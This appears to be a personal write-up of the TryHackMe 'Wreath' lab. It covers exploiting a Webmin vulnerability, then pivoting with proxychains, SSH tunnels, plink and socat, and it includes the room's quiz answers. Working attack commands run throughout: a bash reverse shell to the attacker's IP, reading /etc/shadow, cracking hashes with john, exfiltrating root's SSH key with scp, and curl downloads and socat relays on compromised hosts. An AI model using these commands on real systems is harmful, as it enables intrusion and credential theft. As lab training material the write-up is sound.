# Wreath

**Room Link:** [https://tryhackme.com/r/room/wreath](https://tryhackme.com/r/room/wreath)



## Enumeration

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
echo $VICTIM thomaswreath.thm >> /etc/hosts
```

## Exploitation

**Kali**

```
git clone https://github.com/MuirlandOracle/CVE-2019-15107
cd CVE-2019-15107 && pip3 install -r requirements.txt
sudo apt install python3-pip
chmod +x ./CVE-2019-15107.py
./CVE-2019-15107.py $VICTIM
```

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
nc -nlvp 4444
```

**Victim**

```
bash -i >& /dev/tcp/$KALI/4444 0>&1
bash -i >& /dev/tcp/10.50.86.117/4444 0>&1
```

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
ctrl + Z
stty raw -echo;fg
```

**Victim**

```
cat /etc/shadow
cat /etc/passwd
```

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

No passwords found

**Kali**

```
unshadow passwd shadow > passwords.txt
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

**Victim**

```
cd /root/.ssh/
scp id_rsa root@10.50.86.117:/root/
```

**Kali**

```
chmod 600 id_rsa
ssh -i id_rsa root@$VICTIM
```

## Enumeration

(document later in notes, including the info in tryhackme)

**Victim**

```
arp -a 
```

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

**Victim**

```
cat /etc/hosts 
cat /etc/resolv.conf
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
nmcli dev show 
```

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
for i in {1..255}; do (ping -c 1 10.200.85.${i} | grep "bytes from" &); done
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

**Victim**

```
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```



## Proxychains & Foxyproxy

In this task we'll be looking at two "proxy" tools: Proxychains and FoxyProxy. These both allow us to connect through one of the proxies we'll learn about in the upcoming tasks. When creating a proxy we open up a port on our own attacking machine which is linked to the compromised server, giving us access to the target network.

Think of this as being something like a tunnel created between a port on our attacking box that comes out inside the target network -- like a secret tunnel from a fantasy story, hidden beneath the floorboards of the local bar and exiting in the palace treasure chamber.\


Proxychains and FoxyProxy can be used to direct our traffic through this port and into our target network.

### Proxychains

Proxychains is a tool we have already briefly mentioned in previous tasks. It's a very useful tool -- although not without its drawbacks. Proxychains can often slow down a connection: performing an nmap scan through it is especially hellish. Ideally you should try to use static tools where possible, and route traffic through proxychains only when required.

That said, let's take a look at the tool itself.

Proxychains is a command line tool which is activated by prepending the command `proxychains` to other commands. For example, to proxy netcat  through a proxy, you could use the command:\
`proxychains nc 172.16.0.10 23`\


Notice that a proxy port was not specified in the above command. This is because proxychains reads its options from a config file. The master config file is located at `/etc/proxychains.conf`. This is where proxychains will look by default; however, it's actually the last location where proxychains will look. The locations (in order) are:

1. The current directory (i.e. `./proxychains.conf`)
2. `~/.proxychains/proxychains.conf`
3. `/etc/proxychains.conf`

This makes it extremely easy to configure proxychains for a specific assignment, without altering the master file. Simply execute: `cp /etc/proxychains.conf .`, then make any changes to the config file in a copy stored in your current directory. If you're likely to move directories a lot then you could instead place it in a `.proxychains` directory under your home directory, achieving the same results. If you happen to lose or destroy the original master copy of the proxychains config, a replacement can be downloaded from [here](https://raw.githubusercontent.com/haad/proxychains/master/src/proxychains.conf).\


Speaking of the `proxychains.conf` file, there is only one section of particular use to us at this moment of time: right at the bottom of the file are the servers used by the proxy. You can set more than one server here to chain proxies together, however, for the time being we will stick to one proxy:

![Screenshot of the default proxychains configuration showing the \[Proxylist\] section](https://assets.tryhackme.com/additional/wreath-network/443c865e3ff3.png)

Specifically, we are interested in the "ProxyList" section:\
`[ProxyList]`\
`# add proxy here ...`\
`# meanwhile`\
`# defaults set to "tor"`\
`socks4  127.0.0.1 9050`\


It is here that we can choose which port(s) to forward the connection through. By default there is one proxy set to localhost port 9050 -- this is the default port for a Tor entrypoint, should you choose to run one on your attacking machine. That said, it is not hugely useful to us. This should be changed to whichever (arbitrary) port is being used for the proxies we'll be setting up in the following tasks.\


There is one other line in the Proxychains configuration that is worth paying attention to, specifically related to the Proxy DNS settings:\
![Screenshot showing the proxy\_dns line in the Proxychains config](https://assets.tryhackme.com/additional/wreath-network/3af17f6ddafc.png)\


If performing an Nmap scan through proxychains, this option can cause the scan to hang and ultimately crash. Comment out the `proxy_dns` line using a hashtag (`#`) at the start of the line before performing a scan through the proxy!\
![Proxy\_DNS line commented out with a hashtag](https://assets.tryhackme.com/additional/wreath-network/557437aec525.png)\


Other things to note when scanning through proxychains:

* You can only use TCP scans -- so no UDP or SYN scans. ICMP Echo packets (Ping requests) will also not work through the proxy, so use the  `-Pn`  switch to prevent Nmap from trying it.
* It will be _extremely_ slow. Try to only use Nmap through a proxy when using the NSE (i.e. use a static binary to see where the open ports/hosts are before proxying a local copy of nmap to use the scripts library).

### FoxyProxy

Proxychains is an acceptable option when working with CLI tools, but if working in a web browser to access a webapp through a proxy, there is a better option available, namely: FoxyProxy!

People frequently use this tool to manage their BurpSuite/ZAP proxy quickly and easily, but it can also be used alongside the tools we'll be looking at in subsequent tasks in order to access web apps on an internal network. FoxyProxy is a browser extension which is available for [Firefox](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/) and [Chrome](https://chrome.google.com/webstore/detail/foxyproxy-basic/dookpfaalaaappcdneeahomimbllocnb). There are two versions of FoxyProxy available: Basic and Standard. Basic works perfectly for our purposes, but feel free to experiment with standard if you wish.

After installing the extension in your browser of choice, click on it in your toolbar:\
![FoxyProxy Options button](https://assets.tryhackme.com/additional/wreath-network/c22f2ef3d6fc.png)

Click on the "Options" button. This will take you to a page where you can configure your saved proxies. Click "Add" on the left hand side of the screen:\
![Highlighting the add button on the left hand side of the options menu](https://assets.tryhackme.com/additional/wreath-network/92e3cabe22e8.png)

Fill in the IP and Port on the right hand side of the page that appears, then give it a name. Set the proxy type to the kind of proxy you will be using. SOCKS4 is usually a good bet, although Chisel (which we will cover in a later task) requires SOCKS5. An example config is given here:![Example config showing SOCKS4, 127.0.0.1 and 1337 as the respective options](https://assets.tryhackme.com/additional/wreath-network/19436164d15e.png)\


Press Save, then click on the icon in the task bar again to bring up the proxy menu. You can switch between any of your saved proxies by clicking on them:\
![Highlighting how to switch proxies](https://assets.tryhackme.com/additional/wreath-network/1d91c2b6a625.png)

Once activated, all of your browser traffic will be redirected through the chosen port (so make sure the proxy is active!). Be aware that if the target network doesn't have internet access (like all TryHackMe boxes) then you will not be able to access the outside internet when the proxy is activated. Even in a real engagement, routing your general internet searches through a client's network is unwise anyway, so turning the proxy off (or using the routing features in FoxyProxy standard) for everything other than interaction with the target network is advised.

With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!\


### Answer the questions

**What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?**

```
socks4 127.0.0.1 4242
```

**What command would you use to telnet through a proxy to 172.16.0.100:23?**

```
proxychains telnet 172.16.0.100 23
```

**You have discovered a webapp running on a target inside an isolated network. Which tool is more apt for proxying to a webapp: Proxychains (PC) or FoxyProxy (FP)?**

```
FP
```

## SSH Tunnelling / Port Forwarding

The first tool we'll be looking at is none other than the bog-standard SSH client with an OpenSSH server. Using these simple tools, it's possible to create both forward and reverse connections to make SSH "tunnels", allowing us to forward ports, and/or create proxies.

***

### Forward Connections

Creating a forward (or "local") SSH tunnel can be done from our attacking box when we have SSH access to the target. As such, this technique is much more commonly used against Unix hosts. Linux servers, in particular, commonly have SSH active and open. That said, Microsoft (relatively) recently brought out their own implementation of the OpenSSH server, native to Windows, so this technique may begin to get more popular in this regard if the feature were to gain more traction.

There are two ways to create a forward SSH tunnel using the SSH client -- port forwarding, and creating a proxy.

* Port forwarding is accomplished with the `-L` switch, which creates a link to a Local port. For example, if we had SSH access to 172.16.0.5 and there's a webserver running on 172.16.0.10, we could use this command to create a link to the server on 172.16.0.10:\
  `ssh -L 8000:172.16.0.10:80 user@172.16.0.5 -fN`\
  We could then access the website on 172.16.0.10 (through 172.16.0.5) by navigating to port 8000 _on our own_ _attacking machine._ For example, by entering `localhost:8000` into a web browser. Using this technique we have effectively created a tunnel between port 80 on the target server, and port 8000 on our own box. Note that it's good practice to use a high port, out of the way, for the local connection. This means that the low ports are still open for their correct use (e.g. if we wanted to start our own webserver to serve an exploit to a target), and also means that we do not need to use `sudo` to create the connection. The `-fN` combined switch does two things: `-f` backgrounds the shell immediately so that we have our own terminal back. `-N` tells SSH that it doesn't need to execute any commands -- only set up the connection.\

* Proxies are made using the `-D` switch, for example: `-D 1337`. This will open up port 1337 on your attacking box as a proxy to send data through into the protected network. This is useful when combined with a tool such as proxychains. An example of this command would be:\
  `ssh -D 1337 user@172.16.0.5 -fN`\
  This again uses the `-fN` switches to background the shell. The choice of port 1337 is completely arbitrary -- all that matters is that the port is available and correctly set up in your proxychains (or equivalent) configuration file. Having this proxy set up would allow us to route all of our traffic through into the target network.

### Reverse Connections

Reverse connections are very possible with the SSH client (and indeed may be preferable if you have a shell on the compromised server, but not SSH access). They are, however, riskier as you inherently must access your attacking machine _from_ the target -- be it by using credentials, or preferably a key based system. Before we can make a reverse connection safely, there are a few steps we need to take:

1.  First, generate a new set of SSH keys and store them somewhere safe (`ssh-keygen`):\
    This will create two new files: a private key, and a public key.\


    <figure><img src="https://assets.tryhackme.com/additional/wreath-network/62b2e09ba985.png" alt=""><figcaption></figcaption></figure>

**Kali**

```
ssh-keygen
```

2. Copy the contents of the public key (the file ending with `.pub`), then edit the `~/.ssh/authorized_keys` file on your own attacking machine. You may need to create the `~/.ssh` directory and `authorized_keys` file first.

**Kali**

```
cp ~/.ssh/authorized_keys .
subl authorized_keys 
```

3. On a new line, type the following line, then paste in the public key:\
   `command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty`\
   This makes sure that the key can only be used for port forwarding, disallowing the ability to gain a shell on your attacking machine.

The final entry in the `authorized_keys` file should look something like this:

<figure><img src="https://assets.tryhackme.com/additional/wreath-network/055753470a05.png" alt=""><figcaption></figcaption></figure>

Next. check if the SSH server on your attacking machine is running:\
`sudo systemctl status ssh`

**Victim**

```
sudo systemctl status ssh
```

If the service is running then you should get a response that looks like this (with "active" shown in the message):\
![systemctl output when checking SSH is active. You should see active (running) in the output](https://assets.tryhackme.com/additional/wreath-network/08746aa1021e.png)\


If the status command indicates that the server is not running then you can start the ssh service with:\
`sudo systemctl start ssh`

**Victim**

```
sudo systemctl start ssh
```

The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.

With the key transferred, we can then connect back with a reverse port forward using the following command:\
`ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN`\


To put that into the context of our fictitious IPs: 172.16.0.10 and 172.16.0.5, if we have a shell on 172.16.0.5 and want to give our attacking box (172.16.0.20) access to the webserver on 172.16.0.10, we could use this command on the 172.16.0.5 machine:\
`ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -fN`

**Kali**

```
scp $KEYFILE $USERNAME@$VICTIM:/root/
```

**Victim**

```
ssh -R $LOCAL_PORT:$TARGET_IP:$TARGET_PORT $USERNAME@$ATTACKING_IP -i $KEYFILE -fN
OR
ssh -R 8000:172.16.0.10:80 kali@172.16.0.20 -i $KEYFILE -fN
```

This would open up a port forward to our Kali box, allowing us to access the 172.16.0.10 webserver, in exactly the same way as with the forward connection we made before!

In newer versions of the SSH client, it is also possible to create a reverse proxy (the equivalent of the `-D` switch used in local connections). This may not work in older clients, but this command can be used to create a reverse proxy in clients which do support it:\
`ssh -R 1337 USERNAME@ATTACKING_IP -i KEYFILE -fN`\


**Victim**

```
ssh -R 1337 $USERNAME@$ATTACKING_IP -i $KEYFILE -fN
```

This, again, will open up a proxy allowing us to redirect all of our traffic through localhost port 1337, into the target network.

_Note: Modern Windows comes with an inbuilt SSH client available by default. This allows us to make use of this technique in Windows systems, even if there is not an SSH server running on the Windows system we're connecting back from. In many ways this makes the next task covering plink.exe redundant; however, it is still very relevant for older systems._\


***

To close any of these connections, type `ps aux | grep ssh` into the terminal of the machine that created the connection:

![Highlighting the process id of the ssh proxy/port forward](https://assets.tryhackme.com/additional/wreath-network/daf8fd5c8540.png)

Find the process ID (PID) of the connection. In the above image this is 105238.

Finally, type `sudo kill PID` to close the connection:

![Killing the connection, demonstrating that the connection is now terminated](https://assets.tryhackme.com/additional/wreath-network/dc4393e7991e.png)

### Answer the questions

If you're connecting to an SSH server _from_ your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?

```
L
```

Which switch combination can be used to background an SSH port forward or tunnel?

```
-fN
```

It's a good idea to enter our own password on the remote machine to set up a reverse proxy, Aye or Nay?

```
Nay
```

What command would you use to create a pair of throwaway SSH keys for a reverse connection?

```
ssh-keygen
```

If you wanted to set up a reverse portforward from port 22 of a remote machine (172.16.0.100) to port 2222 of your local machine (172.16.0.200), using a keyfile called `id_rsa` and backgrounding the shell, what command would you use? (Assume your username is "kali")

```
ssh -R $LOCAL_PORT:$TARGET_IP:$TARGET_PORT $USERNAME@$ATTACKING_IP -i $KEYFILE -fN
ssh -R 2222:172.16.0.100:22 kali@172.16.0.200 -i id_rsa -fN
```

What command would you use to set up a forward proxy on port 8000 to user@target.thm, backgrounding the shell?

```
ssh -D $LOCAL_PORT $USERNAME@$TARGET_IP -fN
ssh -D 8000 user@target.thm -fN
```

If you had SSH access to a server (172.16.0.50) with a webserver running internally on port 80 (i.e. only accessible to the server itself on 127.0.0.1:80), how would you forward it to port 8000 on your attacking machine? Assume the username is "user", and background the shell.

```
ssh -L $LOCAL_PORT:127.0.0.1:$TARGET_PORT $USERNAME@$TARGET_IP -fN
ssh -L 8000:127.0.0.1:80 user@172.16.0.50 -fN
```



### plink.exe

Plink.exe is a Windows command line version of the PuTTY SSH client. Now that Windows comes with its own inbuilt SSH client, plink is less useful for modern servers; however, it is still a very useful tool, so we will cover it here.

Generally speaking, Windows servers are unlikely to have an SSH server running so our use of Plink tends to be a case of transporting the binary to the target, then using it to create a reverse connection. This would be done with the following command:\
`cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N`\


Notice that this syntax is nearly identical to previously when using the standard OpenSSH client. The `cmd.exe /c echo y` at the start is for non-interactive shells (like most reverse shells -- with Windows shells being difficult to stabilise), in order to get around the warning message that the target has not connected to this host before.

To use our example from before, if we have access to 172.16.0.5 and would like to forward a connection to 172.16.0.10:80 back to port 8000 our own attacking machine (172.16.0.20), we could use this command:\
`cmd.exe /c echo y | .\plink.exe -R 8000:172.16.0.10:80 kali@172.16.0.20 -i KEYFILE -N`

Note that any keys generated by `ssh-keygen` will not work properly here. You will need to convert them using the `puttygen` tool, which can be installed on Kali using `sudo apt install putty-tools`. After downloading the tool, conversion can be done with:\
`puttygen KEYFILE -o OUTPUT_KEY.ppk`\
Substituting in a valid file for the keyfile, and adding in the output file.\


The resulting `.ppk` file can then be transferred to the Windows target and used in exactly the same way as with the Reverse port forwarding taught in the previous task (despite the private key being converted, it will still work perfectly with the same public key we added to the authorized\_keys file before).\


_Note: Plink is notorious for going out of date quickly, which often results in failing to connect back. Always make sure you have an up to date version of the_ `.exe`_. Whilst there is a copy pre-installed on Kali at_ `/usr/share/windows-resources/binaries/plink.exe`_, downloading a new copy from_ [_here_](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) _before a new engagement is sensible._

### Answer the questions

**What tool can be used to convert OpenSSH keys into PuTTY style keys?**

```
puttygen 
```

## Socat

Socat is not just great for fully stable Linux shells[\[1\]](https://tryhackme.com/room/introtoshells), it's also superb for port forwarding. The one big disadvantage of socat (aside from the frequent problems people have learning the syntax), is that it is very rarely installed by default on a target. That said, static binaries are easy to find for both [Linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat) and [Windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download). Bear in mind that the Windows version is unlikely to bypass Antivirus software by default, so custom compilation may be required. Before we begin, it's worth noting: if you have completed the [What the Shell?](https://tryhackme.com/room/introtoshells) room, you will know that socat can be used to create encrypted connections. The techniques shown here could be combined with the encryption options detailed in the shells room to create encrypted port forwards and relays. To avoid overly complicating this section, this technique will not be taught here; however, it's well worth experimenting with this in your own time.\


Whilst the following techniques could not be used to set up a full proxy into a target network, it is quite possible to use them to successfully forward ports from both Linux and Windows compromised targets. In particular, socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:\


<figure><img src="https://assets.tryhackme.com/additional/wreath-network/502e2fa5765e.png" alt=""><figcaption></figcaption></figure>

It's best to think of socat as a way to join two things together -- kind of like the Portal Gun in the Portal games, it creates a link between two different locations. This could be two ports on the same machine, it could be to create a relay between two different machines, it could be to create a connection between a port and a file on the listening machine, or many other similar things. It is an extremely powerful tool, which is well worth looking into in your own time.

Generally speaking, however, hackers tend to use it to either create reverse/bind shells, or, as in the example above, create a port forward. Specifically, in the above example we're creating a port forward _from_ a port on the compromised server _to_ a listening port on our own box. We could do this the other way though, by either forwarding a connection from the attacking machine to a target inside the network, or creating a direct link between a listening port on the _attacking machine_ with the service on the internal server. This latter application is especially useful as it does not require opening a port on the compromised server.

Before using socat, it will usually be necessary to download a binary for it, then upload it to the box.

For example, with a Python webserver:-

On Kali (inside the directory containing your Socat binary):

`sudo python3 -m http.server 80`

Then, on the target:\
`curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME`

![Demonstration of using cURL with a Python HTTP server to upload files](https://assets.tryhackme.com/additional/wreath-network/f976be91162d.png)

With the binary uploaded, let's have a look at each of the above scenarios in turn.

_Note: This uploads the socat binary with your username in the title; however, the example commands given in the rest of this task will refer to the binary simply as_ `socat`_._\


### Reverse Shell Relay

In this scenario we are using socat to create a relay for us to send a reverse shell back to our own attacking machine (as in the diagram above). First let's start a standard netcat listener on our attacking box (`sudo nc -lvnp 443`). Next, on the compromised server, use the following command to start the relay:\
`./socat tcp-l:8000 tcp:ATTACKING_IP:443 &`\


_Note: the order of the two addresses matters here. Make sure to open the listening port first,_ then _connect back to the attacking machine._\


From here we can then create a reverse shell to the newly opened port 8000 on the compromised server. This is demonstrated in the following screenshot, using netcat on the remote server to simulate receiving a reverse shell from the target server:

![Demonstration of a socat reverse shell relay from the compromised target to the attacking machine using netcat to simulate sending a shell](https://assets.tryhackme.com/additional/wreath-network/e8740afb79ab.png)

A brief explanation of the above command:

* `tcp-l:8000` is used to create the first half of the connection -- an IPv4 listener on tcp port 8000 of the target machine.
* `tcp:ATTACKING_IP:443` connects back to our local IP on port 443. The ATTACKING\_IP obviously needs to be filled in correctly for this to work.
* `&` backgrounds the listener, turning it into a job so that we can still use the shell to execute other commands.

The relay connects back to a listener started using an alias to a standard netcat listener: `sudo nc -lvnp 443`.\


In this way we can set up a relay to send reverse shells through a compromised system, back to our own attacking machine. This technique can also be chained quite easily; however, in many cases it may be easier to just upload a static copy of netcat to receive your reverse shell directly on the compromised server.

### Port Forwarding -- Easy

The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:\
`./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &`\


This opens up port 33060 on the compromised server and redirects the input from the attacking machine straight to the intended target server, essentially giving us access to the (presumably MySQL Database) running on our target of 172.16.0.10. The `fork` option is used to put every connection into a new process, and the `reuseaddr` option means that the port stays open after a connection is made to it. Combined, they allow us to use the same port forward for more than one connection. Once again we use `&` to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.

We can now connect to port 33060 on the relay (172.16.0.5) and have our connection directly relayed to our intended target of 172.16.0.10:3306.

### Port Forwarding -- Quiet

The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not _massive_, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.

First of all, on our own attacking machine, we issue the following command:\
`socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &`

This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the `fork` and `reuseaddr` options set, to allow us to create more than one connection using this port forward.

Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:\
`./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &`\


This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:\
`./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &`\


This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to `localhost:8000` in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!

This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:

* The request goes to `127.0.0.1:8000`
* Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
* Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.

The process is then reversed when the target sends the response:

* The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
* Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.

We have now achieved the same thing as previously, but without opening any ports on the server!\


Finally, we've learnt how to _create_ backgrounded socat port forwards and relays, but it's important to also know how to _close_ these. The solution is simple: run the `jobs` command in your terminal, then kill any socat processes using `kill %NUMBER`:\


<figure><img src="https://assets.tryhackme.com/additional/wreath-network/61ca87aa4350.png" alt=""><figcaption></figcaption></figure>

For the following questions, assume that we are working with a local copy of socat called `socat` in the current



### Answer the question

**Which socat option allows you to reuse the same listening port for more than one connection?**

```
reuseaddr
```

**If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory?**

**Use TCP port 8000 for the server listener, and do not background the process.**

```
./socat tcp-l:8000 tcp:ATTACKING_IP:443 

./socat tcp-l:8000 tcp:172.16.0.200:443 
```

**What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?**

```
./socat tcp-l:$NEWPORT,fork,reuseaddr tcp:$VICTIM:$PORT &

./socat tcp-l:2222,fork,reuseaddr tcp:172.16.0.10:22 &
```











